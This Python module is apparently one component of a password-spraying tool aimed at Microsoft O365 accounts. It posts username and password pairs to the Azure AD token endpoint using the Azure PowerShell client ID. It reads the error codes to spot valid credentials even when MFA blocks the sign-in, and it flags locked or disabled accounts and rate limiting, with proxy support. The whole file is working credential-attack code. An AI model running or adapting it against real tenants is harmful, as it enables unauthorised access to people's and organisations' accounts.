"""Microsoft O365 spray target using OAuth2 ROPC flow."""
import requests

from . import DEFAULT_TIMEOUT as _TIMEOUT

_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"


def attempt(username: str, password: str, proxies: dict | None = None) -> dict:
    """
    Returns dict with keys: success (bool), locked (bool), notes (str).
    success=True means access_token was returned.
    locked=True means AADSTS50053 (account lockout) was returned.
    """
    data = {
        "grant_type": "password",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure PowerShell app ID
        "scope": "https://graph.microsoft.com/.default openid",
        "username": username,
        "password": password,
    }
    try:
        r = requests.post(_TOKEN_URL, data=data, timeout=_TIMEOUT, proxies=proxies)
        body = r.json() if r.content else {}
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    if "access_token" in body:
        return {"success": True, "locked": False, "notes": "valid"}

    error = body.get("error_codes", [])
    if 50053 in error:
        return {"success": False, "locked": True, "notes": "AADSTS50053: account_locked"}
    if 50057 in error:
        return {"success": False, "locked": True, "notes": "AADSTS50057: account_disabled"}
    if 50076 in error:
        return {"success": False, "locked": False, "notes": "AADSTS50076: MFA_required (creds_valid)"}
    if 50079 in error:
        return {"success": False, "locked": False, "notes": "AADSTS50079: MFA_enrollment_required (creds_valid)"}

    desc = body.get("error_description", body.get("error", "unknown"))[:120]
    return {"success": False, "locked": False, "notes": desc}
